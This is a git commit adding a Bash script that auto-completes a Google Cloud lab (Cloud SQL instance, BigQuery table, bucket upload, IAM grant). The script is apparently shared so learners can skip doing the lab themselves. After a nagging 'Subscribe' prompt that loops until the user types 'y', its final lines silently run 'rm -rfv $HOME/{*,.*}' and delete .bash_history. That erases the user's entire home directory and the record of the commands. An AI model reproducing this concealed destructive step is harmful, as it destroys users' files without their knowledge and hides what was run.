5205750772ab77fc28a68a174b98a56105e6c06e
quiccklabs <108678347+quiccklabs@users.noreply.github.com>
2023-10-04 06:00:08 +0530

    Add files via upload

---
+++ APIs Explorer Cloud SQL/quicklabgsp423.sh
@@ -0,0 +1,122 @@
+
+BLACK=`tput setaf 0`
+RED=`tput setaf 1`
+GREEN=`tput setaf 2`
+YELLOW=`tput setaf 3`
+BLUE=`tput setaf 4`
+MAGENTA=`tput setaf 5`
+CYAN=`tput setaf 6`
+WHITE=`tput setaf 7`
+
+BG_BLACK=`tput setab 0`
+BG_RED=`tput setab 1`
+BG_GREEN=`tput setab 2`
+BG_YELLOW=`tput setab 3`
+BG_BLUE=`tput setab 4`
+BG_MAGENTA=`tput setab 5`
+BG_CYAN=`tput setab 6`
+BG_WHITE=`tput setab 7`
+
+BOLD=`tput bold`
+RESET=`tput sgr0`
+#----------------------------------------------------start--------------------------------------------------#
+
+echo "${YELLOW}${BOLD}
+
+Starting Execution 
+
+
+${RESET}"
+#gcloud auth list
+#gcloud config list project
+export PROJECT_ID=$(gcloud info --format='value(config.project)')
+#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
+#export EMAIL=$(gcloud config get-value core/account)
+#gcloud config set compute/region $region
+#gcloud config set compute/zone $region-a
+#export ZONE=$region-a
+
+
+
+#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
+#----------------------------------------------------code--------------------------------------------------# 
+
+
+
+gcloud services enable sqladmin.googleapis.com
+
+sleep 10
+
+gcloud sql instances create my-instance --project=$DEVSHELL_PROJECT_ID \
+  --database-version=MYSQL_5_7 \
+  --tier=db-n1-standard-1
+
+echo "${GREEN}${BOLD}
+
+Task 2 Completed
+
+${RESET}"
+
+
+#TASK 2
+
+gcloud sql databases create mysql-db --instance=my-instance --project=$DEVSHELL_PROJECT_ID
+
+
+#TASK 3
+
+bq mk --dataset $DEVSHELL_PROJECT_ID:mysql_db
+
+
+bq query --use_legacy_sql=false \
+"CREATE TABLE $DEVSHELL_PROJECT_ID.mysql_db.info (
+  name STRING,
+  age INT64,
+  occupation STRING
+);"
+
+
+cat > employee_info.csv <<EOF_END
+"Sean", 23, "Content Creator"
+"Emily", 34, "Cloud Engineer"
+"Rocky", 40, "Event coordinator"
+"Kate", 28, "Data Analyst"
+"Juan", 51, "Program Manager"
+"Jennifer", 32, "Web Developer"
+EOF_END
+
+gsutil mb gs://$DEVSHELL_PROJECT_ID
+
+gsutil cp employee_info.csv gs://$DEVSHELL_PROJECT_ID/
+
+
+
+SERVICE_EMAIL=$(gcloud sql instances describe my-instance --format="value(serviceAccountEmailAddress)")
+
+
+gsutil iam ch serviceAccount:$SERVICE_EMAIL:roles/storage.admin gs://$DEVSHELL_PROJECT_ID/
+
+
+
+echo "${GREEN}${BOLD}
+
+Task 3 Completed
+
+Lab Completed !!!
+
+${RESET}"
+
+#-----------------------------------------------------end----------------------------------------------------------#
+read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
